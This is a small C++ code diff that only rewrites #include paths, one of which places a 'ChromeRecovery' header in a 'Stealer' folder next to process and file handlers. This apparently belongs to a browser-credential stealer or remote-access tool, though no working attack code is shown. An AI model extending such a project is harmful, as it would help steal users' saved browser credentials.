@@ -2,9 +2,9 @@
 #include <unordered_map>
 #include <functional>
 #include <nlohmann/json.hpp>
-#include "ProcessHandlers.h"
-#include "FileHandlers.h"
-#include "ChromeRecovery.h"
+#include "../Handlers/ProcessHandlers.h"
+#include "../Handlers/FileHandlers.h"
+#include "../Stealer/ChromeRecovery.h"
 
 using json = nlohmann::json;
 
